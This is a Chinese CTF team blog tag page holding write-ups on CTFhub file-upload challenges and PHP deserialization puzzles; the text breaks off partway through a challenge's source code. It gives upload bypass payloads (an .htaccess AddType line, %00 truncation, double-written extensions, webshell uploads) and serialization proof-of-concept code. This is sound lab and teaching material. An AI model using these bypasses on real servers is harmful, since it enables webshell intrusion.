@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.1" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>标签: php - Merak</title>
+
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="Merak">
+<meta property="og:url" content="https://we.buptmerak.cn/tags/php/index.html">
+<meta property="og:site_name" content="Merak">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://we.buptmerak.cn/images/og_image.png">
+<meta property="article:author" content="Merak">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://we.buptmerak.cn/images/og_image.png">
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="Merak" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1CGE4V1H26"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1CGE4V1H26');
+</script>
+
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.png" alt="Merak" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/members">Members</a>
+                
+                <a class="navbar-item"
+                href="https://www.ctfhub.com/#/calendar">Calendar</a>
+                
+                <a class="navbar-item"
+                href="/prize">Prizes&amp;Achivement</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    <div class="card-content">
+        <nav class="breadcrumb" aria-label="breadcrumbs">
+        <ul>
+            <li><a href="/tags">标签</a></li>
+            <li class="is-active"><a href="#" aria-current="page">php</a></li>
+        </ul>
+        </nav>
+    </div>
+</div>
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/web/">web</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1257 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="CTFhub-文件上传"><a href="#CTFhub-文件上传" class="headerlink" title="CTFhub 文件上传"></a>CTFhub 文件上传</h1><p>一般所看到的文件上传，除了连🐎那就是通过htaccess来更改php.ini的配置。<br>而也存在是利用上传点进行php反序列化漏洞或是其他的注入。<br>本文主要进行CTFhub上文件上传题的复现。<br>当然可以传一些RCE但是就反而复杂了，直接传🐎<br>就可以更简单一些</p>
+<h2 id="第一题无任何过滤。"><a href="#第一题无任何过滤。" class="headerlink" title="第一题无任何过滤。"></a>第一题无任何过滤。</h2><p>上传一个php文件包含一句话木🐎<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/5I2EFA@9@TY0B4PVLTUZO.png" alt=""></p>
+<hr>
+<h2 id="第二题前端认证"><a href="#第二题前端认证" class="headerlink" title="第二题前端认证"></a>第二题前端认证</h2><p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/63X7YVT9X@2DLR0-1024x549.png" alt=""><br>抓包改包传就可以了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/933RBI5SDB1TK_5RXO481HW-954x1024.png" alt=""><br>蚁剑连上<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/HGF9DFAYEI8EBHOLOJ.png" alt=""></p>
+<hr>
+<h2 id="htaccess文件上传"><a href="#htaccess文件上传" class="headerlink" title=".htaccess文件上传"></a>.htaccess文件上传</h2><p>这个是比较特别的一种解析错误</p>
+<blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</blockquote>
+<p>那么还是先看题目吧<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/AGW7RDXTS89RUHLIKM8J-1024x549.png" alt=""><br>基本过滤了所有的文件类型，唯独.htaccess没有。<br>那么上传这个文件能够得到什么<br>仔细看过之后，<br>发现jpg还是可以用的。那么考虑还是传jpg并且用htaccess让服务器解析jpg转换为解析jpg的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:AddType   application&#x2F;x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>
+<p>剩下的就传一个带🐎的jpg即可<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/@RDFYCS1RCF7KKWIE4Y.png" alt=""><br>得到了flag.</p>
+<hr>
+<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><blockquote>
+<p>MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。<br>也就是服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。那就好办了，不管我上传什么类型的文件，我只要修改Content-Type字段来让检测通过就行了。<br>作者：Maxx_FAN<br>链接：<a href="https://www.jianshu.com/p/01c1d5f05852">https://www.jianshu.com/p/01c1d5f05852</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+</blockquote>
+<p>那和第二个就没啥区别了。。。<br>只需要抓包改包。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/89EAUO_QKYLQE2R7H.png" alt=""><br>不多介绍了</p>
+<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>所谓的文件头我在misc的介绍中讲过了，也就是16进制下每个文件固有的东西。那么我们可以通过编辑整个图片，把一句换木马夹在里面。这样检验文件头也就自然没用了。<br>抓包改后缀以及图片末尾<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/AM5MNCJN9H898Q238ZYG7-954x1024.png" alt=""></p>
+<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/M8WA2ZX285F3CCMCVJYYIV-954x1024.png" alt=""><br>那么就可以上传getshell了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/1YZVATPLC9R_WEZY7Q.png" alt=""></p>
+<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><p>这个是一个耳熟能详的方法了。<br>我想先给大家介绍下原理：</p>
+<blockquote>
+<p>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
+</blockquote>
+<p>也同样有限制条件</p>
+<blockquote>
+<p>PHP&lt;5.3.29，且GPC关闭<br>GPC功能之一就是检查%00被错误认知的情况。所以需要关闭。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php%00;a.jpg</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>原来我也是单纯的认为在文件名处进行截断，如xx.php%00.jpg，这样其实是不对的，提取的时候碰到%00就会认为字符串提取结束了，后面的.jpg就不会再提取，那样的效果还是等于上传了.php的文件，无法绕过。正确的做法还是数据包中必须有上传文件的path才行。结合上传路径+文件名，进行截断。</p>
+</blockquote>
+<p>但是这道题如果直接传的话会变成rand。无法找到文件，所以需要再次截断。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/RC3ERJZRBDE_RJS53DJJ-954x1024.png" alt=""><br>然后getshell就可以了<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/GVYR6CKURZD_K2TGK_VKK.png" alt=""></p>
+<hr>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>题如其名<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/9X0@6@JN1EYWG4PW_VA-1024x549.png" alt=""><br>改成.pphphp就行<br>传马连上就成了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/RV3UY_JIFFI8R7@FZNLGEH-1024x549.png" alt=""><br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/XZI_EVTER0A79IWK5J.png" alt=""><br>就结束了</p>
+<hr>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    
+<div class="card">
+    
+    <div class="card-image">
+        <a href="/2020/03/18/php-bypass/" class="image is-7by1">
+            <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/web/">web</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    9 分钟 读完 (大约 1344 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2020/03/18/php-bypass/">PHP积累</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="php-三种写法"><a href="#php-三种写法" class="headerlink" title="php 三种写法"></a>php 三种写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo (&quot;这是一个 PHP 语言的嵌入范例\n&quot;); ?&gt;</span><br><span class="line">&lt;?php echo(&quot;这是第二个 PHP 语言的嵌入范例\n&quot;); ?&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">echo (&quot;这是类似 JavaScript 及 VBScript 语法</span><br><span class="line">的 PHP 语言嵌入范例&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% echo (&quot;这是类似 ASP 嵌入语法的 PHP 范例&quot;); %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>php://filter简单理解：</p>
+<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
+<p>使用不同的参数可以达到不同的目的和效果：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>指定了你要筛选过滤的数据流</td>
+<td>必选</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符”|”分割</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符”|“分割</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2020/03/18/php-bypass/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/web/">web</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 分钟 读完 (大约 1592 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/">从两道题目浅谈PHP深浅拷贝</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近才认认真真看完PHP，虽然还是有很多地方不会应用，因此想多看看有关PHP的题目，看到了两道和PHP深浅拷贝有关的题目，自己也把它搞懂吧。。</p>
+<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p><strong>题一</strong>：南邮ctf的PHP反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目意图很简单，就是先设置了对象的一个属性的值，如果另一个属性的值和这个设置好的值相等，则得到flag，而<code>get_magic_quotes_gpc()</code>和<code>$pass=stripslashes($pass)</code>只是把加上的转义字符又给去掉，似乎对这个题没有什么影响。最初我以为<code>$o-&gt;secret = &quot;*&quot;</code>就是把这个属性的值设为<code>*</code>，其实是设置成了任意字符，那我们如何将这个满足<code>$o-&gt;secret === $o-&gt;enter</code>这里就要用到<code>PHP深浅拷贝</code>的知识。</p>
+<p>我们举一个栗子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ex1 = <span class="keyword">new</span> Example(<span class="string">'test1'</span>);<span class="comment">// $ex1-&gt;name现在是：test1</span></span><br><span class="line">$ex2 = $ex1;<span class="comment">// $ex2-&gt;name现在是：test1</span></span><br><span class="line"></span><br><span class="line">$ex2-&gt;name = <span class="string">'test2'</span>;<span class="comment">// 这样修改一下之后，$ex1-&gt;name与$ex2-&gt;name都变为了：test2</span></span><br></pre></td></tr></table></figure>
+<p>现在我们应该可以理解<code>对象间引用</code>的概念，他们就相当于是同一个类的同一个对象，PHP5默认通过引用传递对象，假设$obj1和$obj2是两个对象，使用<code>$obj1=$obj2</code>这样的方法复制出的对象是相互关联的，程序中想复制一个值与原来相同的对象，而<code>不希望目标对象与源对象关联</code>，应使用<code>clone</code>关键字。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ex1 = <span class="keyword">new</span> Example(<span class="string">'test1'</span>);<span class="comment">// $ex1-&gt;name现在是：test1</span></span><br><span class="line">$ex2 = <span class="keyword">clone</span> $ex1;<span class="comment">//$ex2-&gt;name现在是：test1</span></span><br><span class="line">$ex2-&gt;name = <span class="string">'test2'</span>;<span class="comment">//现在$ex1-&gt;name还是test1,而$ex2-&gt;name是test2</span></span><br></pre></td></tr></table></figure>
+<p>这里看到，通过clone之后，$ex1与$ex2是两个不同的对象，他们拥有各自的变量环境。但是这里需要注意，在这两个对象内部，<code>拥有的是值类型的数据</code>，如果是内部<code>拥有的是引用类型</code>，那么通过clone得到的<code>新对象中的引用则仍然指向原引用</code></p>
+<p>因此这里就引申出 <strong>浅复制</strong> 与 <strong>深复制</strong> 的概念：</p>
+<blockquote>
+<p><strong>浅复制</strong>： 使用clone来复制对象，这种复制叫做“浅复制“，被赋值对象的所有变量都还有与原来对象相同的值，而所有的<strong>对其他对象的引用都仍然指向原来的对象。</strong><br><strong>深复制</strong>：被复制的对象的所有的变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。</p>
+</blockquote>
+<p>而如果要进行深复制，应该在类中定义一个<code>__clone()</code>方法,在这个方法中完成对目标对象的属性赋以新值，这里就不过多赘述。</p>
+<p>或者<code>利用串行化(冷藏与解冻)</code>，即序列化再反序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$tmp = serialize($ex1);</span><br><span class="line">$ex2 = unserialize($tmp);</span><br></pre></td></tr></table></figure>
+<p>这样得到的$ex2就是一个全新的对象</p>
+<p>最后要引出<code>&amp;</code>，属于浅拷贝，举个例子就能明白了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'crispr'</span>;</span><br><span class="line">$b = &amp;$a;</span><br><span class="line">$b = <span class="string">'crispr copy'</span>;</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//此时$a = 'crispr copy'</span></span><br></pre></td></tr></table></figure>
+<p>类似传地址过去，其实它们的改变是完全同步的，或者说它们就是一体的。</p>
+<p>因此PHP生成的POC如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $enter;</span><br><span class="line">      <span class="keyword">var</span> $secret;</span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;enter=&amp;<span class="keyword">$this</span>-&gt;secret; <span class="comment">//浅拷贝，它们的变化完全同步</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">echo</span> serialize(<span class="keyword">new</span> just4fun());</span><br><span class="line"> </span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>题二：</strong> 2019全国信息安全大赛 JustSoSo<br>  这里我是本地进行复现的，23333，只能分析一下PHP了和构造Poc，其他的文件包含读PHP就省去了。。。</p>
+<p><code>hint.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span 